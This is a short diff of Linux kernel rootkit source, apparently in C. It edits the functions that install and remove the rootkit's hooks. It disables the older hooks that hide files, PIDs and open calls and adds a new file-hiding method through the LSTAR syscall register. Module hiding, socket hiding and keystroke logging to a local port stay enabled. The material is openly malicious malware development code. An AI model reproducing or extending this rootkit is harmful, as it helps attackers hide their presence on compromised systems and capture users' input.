@@ -77,14 +77,14 @@ init_hooks(void)
     if (rootkit.hiding_module)
         hide_module();
 
-    if (rootkit.hiding_files)
-        hide_files();
+    // if (rootkit.hiding_files)
+    //     hide_files();
 
-    if (rootkit.hiding_open)
-        hide_open();
+    // if (rootkit.hiding_open)
+    //     hide_open();
 
-    if (rootkit.hiding_pids)
-        hide_pids();
+    // if (rootkit.hiding_pids)
+    //     hide_pids();
 
     if (rootkit.hiding_sockets)
         hide_sockets();
@@ -100,7 +100,7 @@ init_hooks(void)
     if (rootkit.logging_input)
         log_input("127.0.0.1", "5000");
 
-    test_lstar();
+    hide_files_lstar();
 }
 
 void
@@ -109,16 +109,16 @@ remove_hooks(void)
     if (rootkit.hiding_module)
         unhide_module();
 
-    if (rootkit.hiding_files)
-        unhide_files();
+    // if (rootkit.hiding_files)
+    //     unhide_files();
 
-    if (rootkit.hiding_open)
-        unhide_open();
+    // if (rootkit.hiding_open)
+    //     unhide_open();
 
-    if (rootkit.hiding_pids) {
-        clear_hidden_pids();
-        unhide_pids();
-    }
+    // if (rootkit.hiding_pids) {
+    //     clear_hidden_pids();
+    //     unhide_pids();
+    // }
 
     if (rootkit.hiding_sockets)
         unhide_sockets();
@@ -131,6 +131,8 @@ remove_hooks(void)
 
     if (rootkit.logging_input)
         unlog_input();
+
+    unhide_files_lstar();
 }
 
 void
